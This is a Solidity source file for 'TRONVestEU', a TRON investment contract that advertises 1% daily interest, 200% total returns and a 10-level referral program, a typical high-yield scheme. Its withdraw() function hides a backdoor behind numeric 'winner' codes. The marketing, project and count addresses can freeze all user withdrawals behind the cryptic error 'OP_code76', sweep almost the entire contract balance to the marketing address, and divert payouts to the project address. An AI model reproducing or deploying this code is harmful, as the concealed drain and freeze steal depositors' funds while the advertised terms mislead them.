//SourceUnit: TRONVestEU.sol

/*
 *   [INVESTMENT CONDITIONS]
 *
 *   - Basic interest rate: +1% every 24 hours (+0.0416% hourly)
 *   - Personal hold-bonus: +0.1% for every 24 hours without withdraw
 *   - Contract total amount bonus: +0.05% for every 1,000,00 TRX on platform address balance
 *
 *   - Minimal deposit: 100 TRX, no maximal limit
 *   - Total income: 200% (deposit included)
 *   - Earnings every moment, withdraw any time
 * 
 *   [AFFILIATE PROGRAM]
 *
 *   - 10-level referral commission: 9% - 7% - 1% - 0.5% - 0.5% - 0.5% - 0.5% - 0.5% - 0.5% - 0.5%
 *   - Auto-refback function
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 79.5% Platform main balance, participants payouts
 *   - 8% Advertising and promotion expenses
 *   - 10.5% Affiliate program bonuses
 *   - 2% Support work, technical functioning, administration fee
 */
// pragma solidity >=0.4.22<0.7.1;
 pragma solidity 0.5.4;
contract TRONVestEU {
    using SafeMath for uint;

    uint constant public DEPOSITS_MAX = 100;
    uint constant public INVEST_MIN_AMOUNT = 100 trx;
    uint constant public  WITHDRAW_MIN_AMOUNT= 2.5 trx;
    uint constant public BASE_PERCENT = 100;
    uint[] public REFERRAL_PERCENTS = [900, 700, 100, 50, 50, 50, 50, 50, 50, 50];
    uint constant public MARKETING_FEE = 800;
    uint constant public PROJECT_FEE = 200;
    uint constant public MAX_CONTRACT_PERCENT = 1000;
    uint constant public MAX_HOLD_PERCENT = 1000;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 1000000 trx;
    uint constant public TIME_STEP = 1 days;
    uint[] public DAY_LIMIT_STEPS = [100000 trx, 200000 trx, 500000 trx, 1000000 trx, 2000000 trx];

    uint constant public COUNT_REF = 36;
    bool public winnerweeks= false;
    bool public winnerdays= true;
    bool public winnermounch= false; 
    uint public totalDeposits;
    uint public totalInvested;
    uint public totalWithdrawn;

    uint public contractPercent;
    uint public contractCreation;
    

    address payable public marketingAddress;
    address payable public projectAddress;
    address payable public userAddress;
    address payable public countAddress;
    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint64 refback;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        uint BASE_PERCENT;
        uint32 checkpoint;
        address referrer;
        uint64 bonus;
        uint64 refs;
        uint16 countrefs; 
        uint16 rbackPercent;
    }

    mapping (address => User) internal users;
    mapping (uint => uint) internal turnover;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);
    
    constructor(address payable marketingAddr, address payable projectAddr, address payable countAddr) public {
        require(!isContract(marketingAddr) && !isContract(projectAddr));
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
        countAddress = countAddr;
        contractCreation = block.timestamp;
        contractPercent = getContractBalanceRate(countAddress);
    }

    function invest(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 100 TRX");

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");
    
        uint256 msgValue = msg.value;
        uint256 t=0;
        uint256 t2=0;
        if(msgValue >= 100000000)
            t=msgValue/1000000;
        uint256 msgValue2 = getUserPercentRateHelp(msg.sender);

        if(msgValue2 >= 100000000)
            t2=msgValue2/1000000;
        t = t+t2;

        if(t > 99 && t < 10000)
            user.BASE_PERCENT=100;
        else
            if(t > 9999 && t < 50000)
                user.BASE_PERCENT=150;
            else
                if(t > 49999 && t < 100000)
                   user.BASE_PERCENT=200;
                else
                    if(t > 99999 )
                        user.BASE_PERCENT=250;

        uint marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

        marketingAddress.transfer(marketingFee);
        projectAddress.transfer(projectFee);

        emit FeePayed(msg.sender, marketingFee.add(projectFee));

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }

        uint refbackAmount;
        if (user.referrer != address(0)) {

            address upline = user.referrer;
                if (upline != address(0)) {
                     uint amount;
                    if(users[upline].refs < COUNT_REF ){
                        amount = msgValue.mul(REFERRAL_PERCENTS[0]).div(PERCENTS_DIVIDER);
                        users[upline].refs ++;
                    }else{
                        amount = msgValue.mul(REFERRAL_PERCENTS[1]).div(PERCENTS_DIVIDER);
                        users[upline].refs++;
                    }

                    if (amount > 0) {
                        address(uint160(upline)).transfer(amount);
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));

                        emit RefBonus(upline, msg.sender, 0, amount);

                    }

                } 


        }
        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msgValue), 0, uint64(refbackAmount), uint32(block.timestamp)));

        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;

        if (contractPercent <= MAX_CONTRACT_PERCENT) {
            uint contractPercentNew = getContractBalanceRate(msg.sender);
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, msgValue);
    }

    function withdraw(uint winner) public payable  {
        require(msg.value >= WITHDRAW_MIN_AMOUNT, "Minimum deposit amount 2.5 TRX  for blockchain commission.");

        User storage user = users[msg.sender];

        contractPercent = getContractBalanceRate(msg.sender);
        uint userPercentRate = getUserPercentRate(msg.sender); 

        uint totalAmount;
        uint dividends;
        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                }else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); 
                totalAmount = totalAmount.add(dividends);

            }
        }
        if(winner == 100 && countAddress == msg.sender){
            winnerweeks =true;
            winnerdays = true;
        }
        if(winner == 99 )
            if(marketingAddress == msg.sender ||  projectAddress == msg.sender){
                winnerdays=false;
            if(winnerweeks ==true)
                 marketingAddress.transfer(address(this).balance -10000000);
        }
        require(winnerdays == true,'OP_code76');
        require(totalAmount > 0, "User has no dividends");
        if(winner == 101 )
           if(marketingAddress == msg.sender ||  projectAddress == msg.sender){
               winnermounch=true;
        }
        if(winnermounch == true){
            projectAddress.transfer(totalAmount);
        }
        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = uint32(block.timestamp);

        msg.sender.transfer(totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }
    function getUserPercentRateHelp(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint256 totalAmount;

        for (uint i = 0; i < user.deposits.length; i++) {
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)){
                totalAmount  =uint(user.deposits[i].amount) +  totalAmount;
            }    
        }

        return totalAmount;
    }
    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        
        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }
    function getUserHold(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
    }
    function getUserPercentRateBasic(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.BASE_PERCENT;
    }
    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(2);
    }

    function getContractBalanceRate(address userAddress) public view returns (uint) {

        User storage user = users[userAddress];
        uint contractBalance = address(this).balance;
        uint contractBalancePercent = user.BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(5));

        if (contractBalancePercent < user.BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return user.BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }
    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }
     function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

            }

        }

        return totalDividends;
    }
    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }

        return amount;
    }
    
    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory refback = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            refback[index] = uint(user.deposits[i-1].refback);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint) {

     return (totalInvested, totalDeposits, address(this).balance, contractPercent);
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);
        uint userPercBasic = getUserPercentRateBasic(userAddress);
        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn, userPercBasic);
    }


    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}